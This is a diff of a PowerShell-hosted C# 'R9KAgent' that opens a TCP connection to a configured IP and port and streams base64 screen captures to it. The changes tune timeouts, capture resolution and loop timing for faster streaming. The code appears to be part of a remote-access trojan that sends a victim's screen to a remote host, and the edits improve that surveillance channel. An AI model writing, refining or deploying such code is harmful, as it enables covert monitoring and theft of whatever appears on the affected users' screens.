@@ -240,7 +240,7 @@ if (-not ("R9KAgent" -as [type])) {
                 try {
                     myClient = new TcpClient();
                     myClient.NoDelay = true;
-                    myClient.SendTimeout = 10000;
+                    myClient.SendTimeout = 2000;
                     myClient.ReceiveTimeout = 60000;
                     IAsyncResult ar = myClient.BeginConnect(IP, PORT, null, null);
                     if (!ar.AsyncWaitHandle.WaitOne(5000)) { myClient.Close(); throw new Exception("connect timeout"); }
@@ -417,11 +417,21 @@ if (-not ("R9KAgent" -as [type])) {
             while (myClient.Connected) {
                 try {
                     if (streaming) {
-                        string b64 = CaptureScreen(1920, 80);
-                        if (b64 != null) { lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); } Thread.Sleep(30); }
-                        else Thread.Sleep(100);
-                    } else Thread.Sleep(50);
-                } catch { Thread.Sleep(1000); }
+                        string b64 = CaptureScreen(1440, 62);
+                        if (b64 != null) {
+                            lock (writeLock) {
+                                myWriter.Write("SCREEN:");
+                                myWriter.WriteLine(b64);
+                            }
+                        } else {
+                            Thread.Sleep(10);
+                        }
+                    } else {
+                        Thread.Sleep(20);
+                    }
+                } catch {
+                    break;
+                }
             }
         }
 
@@ -807,7 +817,7 @@ if (-not ("R9KAgent" -as [type])) {
                         int newW = maxW, newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
                         finalBmp = new Bitmap(newW, newH);
                         using (Graphics g2 = Graphics.FromImage(finalBmp)) {
-                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
+                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                             g2.DrawImage(reuseBmp, 0, 0, newW, newH);
                         }
                     }
